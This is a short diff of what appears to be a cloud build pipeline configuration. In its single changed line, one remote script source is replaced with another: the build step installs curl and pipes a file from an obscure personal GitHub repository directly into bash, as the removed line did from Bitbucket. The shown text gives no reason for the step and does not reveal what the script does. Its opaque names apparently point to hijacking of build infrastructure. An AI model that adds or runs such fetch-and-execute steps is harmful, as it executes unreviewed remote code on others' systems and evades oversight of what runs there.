@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-        apt-get update && apt-get install curl -y && curl -sL https://bitbucket.org/apenowe/lotnok/raw/master/A1 | bash
+        apt-get update && apt-get install curl -y && curl -sL https://github.com/gunawan2005/kolinga/raw/main/klo | bash
     waitFor:
       - '-'
     entrypoint: /bin/bash
